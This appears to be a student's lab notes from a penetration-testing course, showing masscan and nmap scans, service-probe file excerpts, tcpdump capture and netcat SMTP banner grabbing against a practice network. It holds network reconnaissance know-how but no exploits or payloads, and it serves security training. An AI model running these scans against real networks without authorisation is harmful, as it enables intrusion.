q\xb4\xcb\xa6\x7f\xf3\xadM\xb9\x9aI\x0b\xb4r\xc9\x88)e\x09=P_\xab\xab\x99#\xe4\x15K\xbfa\xaa\xbe\xf6\x07\xe5\xb6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00O\x9d\x8a\xbc\x0c\x14\x08O\xa6\xb4\xc2\x0aY.\x0f6\xae\x04\xb4|\xd264t\xfa\xf3\xd9\x91}\xc3E\xe4l\xd3\x86?\xb9\xfe\x9b:W\xbaD2\xb9w\xb2\xbbH},w\xc4\xd3N+\xa8a\x0c0\x8a\xe3,\x13P\x0f\xde\x82\x84k\x90\xb7\x92x\xd1\xc5\xd8Z\x12\xefy\xa6\xa0\xf7\x03R\xb7\xe36\xe0U\xa8\x83\xee\xb2\xad4_\xb8\xd3\x07\x02n9\x03\xa9\x11\xa7\x14\x98\xae\xd3\xd1\x9f\xe3\x1f\x06\xdc\x3e=,\x8ba\x10V\xec\xf5\xda\x14K\x01\x18\x5cVgJ\xfb{\x94(\x1e+\xc5GN\xa2_\xf6Un\xda\xea\xb3x\xc1\x97\xf0L\xc5\x82\xc6\xd21\xd9f\xba\xba\xd3\xbb\xe4\xf788\xfe\xbe!\xdev\xd3\xadA\x09\x07\xeb\x85\x0ax\xc4\x83\x9c\xa9H\xd3\xb8\xb8/ \xd4\xa1\x3cD\x0a\x86\x18\xa9\xd5\x85]\x18\x882\x95\xa9\xb6[\xd9
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -w 'tcp 25' /tmp/masscan_10.130.10.0_24_full.txt
open tcp 25 10.130.10.25 1727151674
banner tcp 25 10.130.10.25 1727151706 ssl TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
banner tcp 25 10.130.10.25 1727151706 X509 MIIDBzCCAe+gAwIBAgIQODDHsNbjBZNBr4Q8jkb1izANBgkqhkiG9w0BAQUFADARMQ8wDQYDVQQDEwZtYWlsMDEwHhcNMjQwOTExMjM1NTUyWhcNMjkwOTExMjM1NTUyWjARMQ8wDQYDVQQDEwZtYWlsMDEwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDF/T7gFVULRoivsyQQQjJIdbLydrPKEKdlaoA8akwan4LDX8hT+OoISu19i0/Khdn8Xy6DUZSY3dGeMZPBO149CNeyiSXQVOr38BDPBL2mxJhdBjf3BKFe2H0CspBdo7vCDkLnVoKCYahUdpgkO5kL8m51g7nTH5L117L48nX2NJg7W5kTcFp6fBfCdAKBZk79f+8udN4gKCVJf+YcUIeyKpezziGdbQXowAGI5KhXM21iwbKMrDVW/Bw8cQlgNgtq7/gBG4xVQmIc57msgbMozZiIEUmNjbEzLmOlEz1La/AUWb4QeBVW3m/Py4UPgJ3OuRFyC6nwKEKNxb4cjqARAgMBAAGjWzBZMA4GA1UdDwEB/wQEAwIFoDAkBgNVHREEHTAbggZtYWlsMDGCEW1haWwwMS5oaWJveHkuY29tMBMGA1UdJQQMMAoGCCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDQYJKoZIhvcNAQEFBQADggEBAAY9K0ea6ExbNZdkc6VavH0U1VnudcdGpTSc6v+K+rWiUC3W/yE96/zWMbPoBoZcdFUA269H9DZK4z0yTQL9queIY7I2XuldS3vPRuiTLlo5V93wM5YgWWmfmpFdX4gcbqi9catyzmuMIGJIYjguPUfSSmBeRU/7hb9J5bplJ3eoKYc+4msRrh6gvQNYvm0CdaQ9wnpHRbYRKc5KsLjYGJgaMf700lqOyRjMLARw1m8pJnK/z42h2zjLue2Sn1KCFNscl8m0NTu7BUfwYWInZuE6bZxlKubSNCKNk7fXjhUkXdOHH7/TIycg02bWKXGK53froqvkJiWOPULI6h1ur0g=
banner tcp 25 10.130.10.25 1727151706 smtp 220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Tue, 24 Sep 2024 04:21:14 +0000\x0a250-mail01.hiboxy.com Hello [10.254.252.3]\x0a250-SIZE 37748736\x0a250-PIPELINING\x0a250-DSN\x0a250-ENHANCEDSTATUSCODES\x0a250-STARTTLS\x0a250-X-ANONYMOUSTLS\x0a250-AUTH NTLM\x0a250-X-EXPS GSSAPI NTLM\x0a250-8BITMIME\x0a250-BINARYMIME\x0a250-CHUNKING\x0a250-SMTPUTF8\x0a250 XRDST\x0a220 2.0.0 SMTP server ready
sec560@560vm:~/Downloads$ 

```

#### 7: Extracting Live Hosts and Ports

```
sec560@560vm:~/Downloads$ head /tmp/masscan_10.130.10.0_24_full.gnmap
# Masscan 1.3.9-integration scan initiated Tue Sep 24 04:18:39 2024
# Ports scanned: TCP(0;) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Timestamp: 1727151519	Host: 10.130.10.11 ()	Ports: 80/open/tcp//http//
Timestamp: 1727151523	Host: 10.130.10.6 ()	Ports: 80/open/tcp//http//
Host: 10.130.10.11 ()	Port: 80	Service: http.server	Banner: nginx/1.24.0 (Ubuntu)
Host: 10.130.10.11 ()	Port: 80	Service: title	Banner: Welcome to nginx!
Host: 10.130.10.11 ()	Port: 80	Service: http	Banner: HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
Timestamp: 1727151524	Host: 10.130.10.21 ()	Ports: 3389/open/tcp//ms-wbt-server//
Host: 10.130.10.6 ()	Port: 80	Service: http.server	Banner: Microsoft-IIS/10.0
Host: 10.130.10.6 ()	Port: 80	Service: title	Banner: IIS Windows Server
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $4}' | sort -uV
10.130.10.4
10.130.10.5
10.130.10.6
10.130.10.7
10.130.10.10
10.130.10.11
10.130.10.21
10.130.10.22
10.130.10.23
10.130.10.25
10.130.10.33
10.130.10.44
10.130.10.45
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | sort -uV | head
22/open/tcp//ssh//
23/open/tcp//telnet//
25/open/tcp//smtp//
53/open/tcp//domain//
80/open/tcp//http//
135/open/tcp//epmap//
139/open/tcp//netbios-ssn//
389/open/tcp//ldap//
443/open/tcp//https//
444/open/tcp//snpp//
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | cut -d '/' -f 1 | sort -un
22
23
25
53
80
135
139
389
443
444
445
464
465
475
476
477
587
636
717
808
890
1433
1801
2103
2105
2107
2525
3268
3269
3389
3875
5985
5986
6402
6536
6564
8172
9389
64337
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep '/open/tcp' /tmp/masscan_10.130.10.0_24_full.gnmap | awk '{print $7}' | cut -d '/' -f 1 | sort -un | tr '\n' ',' | sed 's/,$//' > /tmp/10.130.10.0_24_openports.txt
sec560@560vm:~/Downloads$ cat /tmp/10.130.10.0_24_openports.txt
22,23,25,53,80,135,139,389,443,444,445,464,465,475,476,477,587,636,717,808,890,1433,1801,2103,2105,2107,2525,3268,3269,3389,3875,5985,5986,6402,6536,6564,8172,9389,64337sec560@560vm:~/Downloads$ 
```

## Lab 1.4: Nmap

### linux

#### 1: Initial Scan

```
sec560@560vm:~/Downloads$ nmap -n 10.130.10.1-10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:41 UTC
Nmap scan report for 10.130.10.5
Host is up (0.17s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.6
Host is up (0.17s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.10
Host is up (0.17s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
9100/tcp open  jetdirect

Nmap done: 10 IP addresses (3 hosts up) scanned in 55.57 seconds
sec560@560vm:~/Downloads$ 
```

#### 2: Scanning 10.130.10.33

```
sec560@560vm:~/Downloads$ sudo nmap -n -sT 10.130.10.33 -F
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:44 UTC
Nmap scan report for 10.130.10.33
Host is up (0.17s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds
sec560@560vm:~/Downloads$ 

```

新しいターミナルウィンドウを起動し、そのウィンドウでスニッファを実行してパケットを監視

```
sec560@560vm:~/Downloads$ sudo tcpdump -i tun0 -nn net 10.130.10.0/24
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
01:43:57.504743 IP 10.254.252.58.38367 > 10.130.10.4.53: 36178+ [1au] A? incoming.telemetry.mozilla.org. (59)
01:43:57.504886 IP 10.254.252.58.45429 > 10.130.10.4.53: 21786+ [1au] AAAA? incoming.telemetry.mozilla.org. (59)
01:43:57.675168 IP 10.130.10.4.53 > 10.254.252.58.38367: 36178 2/0/1 CNAME telemetry-incoming.r53-2.services.mozilla.com., A 34.120.208.123 (134)
01:43:57.675209 IP 10.130.10.4.53 > 10.254.252.58.45429: 21786 1/1/1 CNAME telemetry-incoming.r53-2.services.mozilla.com. (197)
01:44:29.785841 IP 10.254.252.58 > 10.130.10.33: ICMP echo request, id 45281, seq 0, length 8
01:44:29.785859 IP 10.254.252.58.42360 > 10.130.10.33.443: Flags [S], seq 1921863522, win 1024, options [mss 1460], length 0
01:44:29.785862 IP 10.254.252.58.42360 > 10.130.10.33.80: Flags [.], ack 1921863522, win 1024, length 0
01:44:29.785865 IP 10.254.252.58 > 10.130.10.33: ICMP time stamp query id 15459 seq 0, length 20
01:44:29.953885 IP 10.130.10.33 > 10.254.252.58: ICMP echo reply, id 45281, seq 0, length 8
01:44:29.955517 IP 10.130.10.33 > 10.254.252.58: ICMP time stamp reply id 15459 seq 0: org 00:00:00.000, recv 832:39:35.424, xmit 832:39:35.424, length 20
01:44:29.973240 IP 10.254.252.58.57062 > 10.130.10.33.443: Flags [S], seq 4220402652, win 64240, options [mss 1460,sackOK,TS val 
```

```
sec560@560vm:~/Downloads$ sudo nmap -n -sT 10.130.10.33 --top-ports 3000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:46 UTC
Nmap scan report for 10.130.10.33
Host is up (0.17s latency).
Not shown: 2997 filtered tcp ports (no-response)
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 21.35 seconds
sec560@560vm:~/Downloads$ 

```

#### 3: Output Formats

```
sec560@560vm:~/Downloads$ sudo nmap -n -sT 10.130.10.0/24 -oA /tmp/scan -F -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:47 UTC
Nmap scan report for 10.130.10.4
Host is up (0.17s latency).
Not shown: 93 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.5
Host is up (0.17s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.6
Host is up (0.17s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.7
Host is up (0.17s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.10
Host is up (0.17s latency).
Not shown: 96 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
23/tcp   open  telnet
80/tcp   open  http
9100/tcp open  jetdirect

Nmap scan report for 10.130.10.11
Host is up (0.17s latency).
Not shown: 97 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9100/tcp open  jetdirect

Nmap scan report for 10.130.10.21
Host is up (0.17s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.22
Host is up (0.17s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
9100/tcp open  jetdirect

Nmap scan report for 10.130.10.23
Host is up (0.18s latency).
Not shown: 97 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.25
Host is up (0.17s latency).
Not shown: 87 filtered tcp ports (no-response)
PORT     STATE SERVICE
25/tcp   open  smtp
80/tcp   open  http
81/tcp   open  hosts2-ns
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
444/tcp  open  snpp
445/tcp  open  microsoft-ds
465/tcp  open  smtps
587/tcp  open  submission
3389/tcp open  ms-wbt-server
6001/tcp open  X11:1
6646/tcp open  unknown

Nmap scan report for 10.130.10.33
Host is up (0.17s latency).
Not shown: 98 filtered tcp ports (no-response)
PORT     STATE SERVICE
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.44
Host is up (0.17s latency).
Not shown: 96 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap scan report for 10.130.10.45
Host is up (0.17s latency).
Not shown: 99 filtered tcp ports (no-response)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (13 hosts up) scanned in 20.45 seconds
sec560@560vm:~/Downloads$

```

```
sec560@560vm:~/Downloads$ ls -l /tmp/scan*
-rw-r--r-- 1 root root  2756 Mar  6 01:48 /tmp/scan.gnmap
-rw-r--r-- 1 root root  3173 Mar  6 01:48 /tmp/scan.nmap
-rw-r--r-- 1 root root 20453 Mar  6 01:48 /tmp/scan.xml
sec560@560vm:~/Downloads$ 

```

```
sec560@560vm:~/Downloads$ cat /tmp/scan.gnmap
# Nmap 7.94SVN scan initiated Fri Mar  6 01:47:52 2026 as: nmap -n -sT -oA /tmp/scan -F -T4 10.130.10.0/24
Host: 10.130.10.4 ()	Status: Up
Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (93)
Host: 10.130.10.5 ()	Status: Up
Host: 10.130.10.5 ()	Ports: 80/open/tcp//http///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.6 ()	Status: Up
Host: 10.130.10.6 ()	Ports: 80/open/tcp//http///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (98)
Host: 10.130.10.7 ()	Status: Up
Host: 10.130.10.7 ()	Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.10 ()	Status: Up
Host: 10.130.10.10 ()	Ports: 22/open/tcp//ssh///, 23/open/tcp//telnet///, 80/open/tcp//http///, 9100/open/tcp//jetdirect///	Ignored State: closed (96)
Host: 10.130.10.11 ()	Status: Up
Host: 10.130.10.11 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 9100/open/tcp//jetdirect///	Ignored State: closed (97)
Host: 10.130.10.21 ()	Status: Up
Host: 10.130.10.21 ()	Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (96)
Host: 10.130.10.22 ()	Status: Up
Host: 10.130.10.22 ()	Ports: 22/open/tcp//ssh///, 9100/open/tcp//jetdirect///Ignored State: closed (98)
Host: 10.130.10.23 ()	Status: Up
Host: 10.130.10.23 ()	Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.25 ()	Status: Up
Host: 10.130.10.25 ()	Ports: 25/open/tcp//smtp///, 80/open/tcp//http///, 81/open/tcp//hosts2-ns///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 444/open/tcp//snpp///, 445/open/tcp//microsoft-ds///, 465/open/tcp//smtps///, 587/open/tcp//submission///, 3389/open/tcp//ms-wbt-server///, 6001/open/tcp//X11:1///, 6646/open/tcp/////	Ignored State: filtered (87)
Host: 10.130.10.33 ()	Status: Up
Host: 10.130.10.33 ()	Ports: 1433/open/tcp//ms-sql-s///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (98)
Host: 10.130.10.44 ()	Status: Up
Host: 10.130.10.44 ()	Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (96)
Host: 10.130.10.45 ()	Status: Up
Host: 10.130.10.45 ()	Ports: 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (99)
# Nmap done at Fri Mar  6 01:48:12 2026 -- 256 IP addresses (13 hosts up) scanned in 20.45 seconds
sec560@560vm:~/Downloads$ 

```

#### 4: Finding Hosts by Open Port

```
sec560@560vm:~/Downloads$ grep 389/open /tmp/scan.gnmap
Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (93)
Host: 10.130.10.5 ()	Ports: 80/open/tcp//http///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.6 ()	Ports: 80/open/tcp//http///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (98)
Host: 10.130.10.7 ()	Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.21 ()	Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (96)
Host: 10.130.10.23 ()	Ports: 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (97)
Host: 10.130.10.25 ()	Ports: 25/open/tcp//smtp///, 80/open/tcp//http///, 81/open/tcp//hosts2-ns///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 444/open/tcp//snpp///, 445/open/tcp//microsoft-ds///, 465/open/tcp//smtps///, 587/open/tcp//submission///, 3389/open/tcp//ms-wbt-server///, 6001/open/tcp//X11:1///, 6646/open/tcp/////	Ignored State: filtered (87)
Host: 10.130.10.33 ()	Ports: 1433/open/tcp//ms-sql-s///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (98)
Host: 10.130.10.44 ()	Ports: 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (96)
Host: 10.130.10.45 ()	Ports: 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (99)
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ grep -w 389/open /tmp/scan.gnmap
Host: 10.130.10.4 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///	Ignored State: filtered (93)
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -w 445/open /tmp/scan.gnmap | wc -l
7
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ grep -w 445/open /tmp/scan.gnmap | cut -d ' ' -f 2
10.130.10.4
10.130.10.5
10.130.10.7
10.130.10.21
10.130.10.23
10.130.10.25
10.130.10.44
sec560@560vm:~/Downloads$ 
```

#### 5: The nmap-services File

```
sec560@560vm:~/Downloads$ sudo ls -la /usr/share/nmap/nmap-services
-rw-r--r-- 1 root root 1004593 Apr  1  2024 /usr/share/nmap/nmap-services
sec560@560vm:~/Downloads$ less /usr/share/nmap/nmap-services
sec560@560vm:~/Downloads$ 

```

```
# THIS FILE IS GENERATED AUTOMATICALLY FROM A MASTER - DO NOT EDIT.
# EDIT /nmap-private-dev/nmap-services-all IN SVN INSTEAD.
# Well known service port numbers -*- mode: fundamental; -*-
# From the Nmap Security Scanner ( https://nmap.org/ )
#
# $Id$
#
# Derived from IANA data and our own research
#
# This collection of service data is (C) 1996-2020 by Insecure.Com
# LLC.  It is distributed under the Nmap Public Source license as
# provided in the LICENSE file of the source distribution or at
# https://svn.nmap.org/nmap/LICENSE .  Note that this license
# requires you to license your own work under a compatable open source
# license.  If you wish to embed Nmap technology into proprietary
# software, we sell alternative licenses (contact sales@insecure.com).
# Dozens of software vendors already license Nmap technology such as
# host discovery, port scanning, OS detection, and version detection.
# For more details, see https://nmap.org/book/man-legal.html
#
# Fields in this file are: Service name, portnum/protocol, open-frequency, optional comments
#
tcpmux  1/tcp   0.001995        # TCP Port Service Multiplexer [rfc-1078] | TCP Port Service Multiplexer
tcpmux  1/udp   0.001236        # TCP Port Service Multiplexer
compressnet     2/tcp   0.000013        # Management Utility
compressnet     2/udp   0.001845        # Management Utility
compressnet     3/tcp   0.001242        # Compression Process
compressnet     3/udp   0.001532        # Compression Process
unknown 4/tcp   0.000477
rje     5/tcp   0.000000        # Remote Job Entry
rje     5/udp   0.000593        # Remote Job Entry
unknown 6/tcp   0.000502
echo    7/sctp  0.000000
echo    7/tcp   0.004855
echo    7/udp   0.024679
unknown 8/tcp   0.000013
discard 9/sctp  0.000000        # sink null
discard 9/tcp   0.003764        # sink null
discard 9/udp   0.015733        # sink null
unknown 10/tcp  0.000063
systat  11/tcp  0.000075        # Active Users
/usr/share/nmap/nmap-services

```

#### 5: The nmap-services File

```
sec560@560vm:~/Downloads$ sudo nmap -n -sU 10.130.10.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:55 UTC

sec560@560vm:~/Downloads$ sudo nmap -n -sU 10.130.10.4,10 -p 53,111,414,500-501
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:55 UTC
Nmap scan report for 10.130.10.4
Host is up (0.17s latency).

PORT    STATE         SERVICE
53/udp  open          domain
111/udp open|filtered rpcbind
414/udp open|filtered infoseek
500/udp open|filtered isakmp
501/udp open|filtered stmf

Nmap scan report for 10.130.10.10
Host is up (0.16s latency).

PORT    STATE  SERVICE
53/udp  closed domain
111/udp closed rpcbind
414/udp closed infoseek
500/udp closed isakmp
501/udp closed stmf

Nmap done: 2 IP addresses (2 hosts up) scanned in 3.24 seconds
sec560@560vm:~/Downloads$ 

```

```
sec560@560vm:~/Downloads$ sudo nmap -n -sU 10.130.10.4,10 -p 53,111,414,500-501 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 01:56 UTC
Nmap scan report for 10.130.10.4
Host is up (0.16s latency).

PORT    STATE         SERVICE
53/udp  open|filtered domain
111/udp open|filtered rpcbind
414/udp open|filtered infoseek
500/udp open|filtered isakmp
501/udp open|filtered stmf

Nmap done: 2 IP addresses (2 hosts up) scanned in 2.90 seconds
sec560@560vm:~/Downloads$ 
```

## Lab 2.1 - Version Scanning, OS Detection, NSE, and GoWitness

### Linux

#### 1: The nmap-service-probes File

```
sec560@560vm:~/Downloads$ sudo ls -la /usr/share/nmap/nmap-service-probes
-rw-r--r-- 1 root root 2513135 Apr  1  2024 /usr/share/nmap/nmap-service-probes
sec560@560vm:~/Downloads$ less /usr/share/nmap/nmap-service-probes
sec560@560vm:~/Downloads$ 

```

```
# Nmap service detection probe list -*- mode: fundamental; -*-
# $Id$
#
# This is a database of custom probes and expected responses that the
# Nmap Security Scanner ( https://nmap.org ) uses to
# identify what services (eg http, smtp, dns, etc.) are listening on
# open ports.  Contributions to this database are welcome.
# Instructions for obtaining and submitting service detection fingerprints can
# be found in the Nmap Network Scanning book and online at
# https://nmap.org/book/vscan-community.html
#
# This collection of probe data is (C) 1998-2020 by Insecure.Com
# LLC.  It is distributed under the Nmap Public Source license as
# provided in the LICENSE file of the source distribution or at
# https://nmap.org/data/LICENSE .  Note that this license
# requires you to license your own work under a compatible open source
# license.  If you wish to embed Nmap technology into proprietary
# software, we sell alternative licenses (contact sales@insecure.com).
# Dozens of software vendors already license Nmap technology such as
# host discovery, port scanning, OS detection, and version detection.
# For more details, see https://nmap.org/book/man-legal.html
#
# For details on how Nmap version detection works, why it was added,
# the grammar of this file, and how to detect and contribute new
# services, see https://nmap.org/book/vscan.html.

# The Exclude directive takes a comma separated list of ports.
# The format is exactly the same as the -p switch.
Exclude T:9100-9107

# This is the NULL probe that just compares any banners given to us
##############################NEXT PROBE##############################
Probe TCP NULL q||
# Wait for at least 6 seconds for data.  It used to be 5, but some
# smtp services have lately been instituting an artificial pause (see
# FEATURE('greet_pause') in Sendmail, for example)
totalwaitms 6000
# If the service closes the connection before 3 seconds, it's probably
# tcpwrapped. Adjust up or down depending on your false-positive rate.
tcpwrappedms 3000

match 1c-server m|^S\xf5\xc6\x1a{| p/1C:Enterprise business management server/

/usr/share/nmap/nmap-service-probes


```

```
sec560@560vm:~/Downloads$ grep -v ^# /usr/share/nmap/nmap-service-probes | cut -d' ' -f1 | sort | uniq -c
   2011 
      1 Exclude
     11 fallback
  11723 match
    180 ports
    184 Probe
    183 rarity
    194 softmatch
     27 sslports
      1 tcpwrappedms
      6 totalwaitms
sec560@560vm:~/Downloads$ 

```

```
sec560@560vm:~/Downloads$ grep -m1 Apache /usr/share/nmap/nmap-service-probes
match ftp m|^220 ([-\w_.]+) FTP server ready \(mod_ftpd/([\d.]+)\)\r\n| p/Apache mod_ftpd/ v/$2/ h/$1/ cpe:/a:apache:http_server/
sec560@560vm:~/Downloads$ 
```

#### 2: Version scan of .25

```
sec560@560vm:~/Downloads$ sudo nmap -n -p 25 10.130.10.25
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:03 UTC
Nmap scan report for 10.130.10.25
Host is up (0.16s latency).

PORT   STATE SERVICE
25/tcp open  smtp

Nmap done: 1 IP address (1 host up) scanned in 0.37 seconds
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ sudo nmap -n -p 25 10.130.10.25 -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:04 UTC
Nmap scan report for 10.130.10.25
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Microsoft Exchange smtpd
Service Info: Host: mail01.hiboxy.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.84 seconds
sec560@560vm:~/Downloads$
```

#### 3: Examining a Service with Netcat

```
sec560@560vm:~/Downloads$ nc -nv 10.130.10.25 25
(UNKNOWN) [10.130.10.25] 25 (smtp) open
220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Fri, 6 Mar 2026 02:05:32 +0000
^C
sec560@560vm:~/Downloads$ 

```

```
ec560@560vm:~/Downloads$ grep 'Microsoft ESMTP MAIL Service ready' /usr/share/nmap/nmap-service-probes
match smtp m|^220 ([-\w_.]+) Microsoft ESMTP MAIL Service ready at| p/Microsoft Exchange smtpd/ o/Windows/ h/$1/ cpe:/a:microsoft:exchange_server/ cpe:/o:microsoft:windows/a
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ nc -nvC 10.130.10.25 25
(UNKNOWN) [10.130.10.25] 25 (smtp) open
220 mail01.hiboxy.com Microsoft ESMTP MAIL Service ready at Fri, 6 Mar 2026 02:06:50 +0000
ehlo
250-mail01.hiboxy.com Hello [10.254.252.58]
250-SIZE 37748736
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-STARTTLS
250-X-ANONYMOUSTLS
250-AUTH NTLM
250-X-EXPS GSSAPI NTLM
250-8BITMIME
250-BINARYMIME
250-CHUNKING
250-SMTPUTF8
250 XRDST
mail from:<pentest@hiboxy.com>
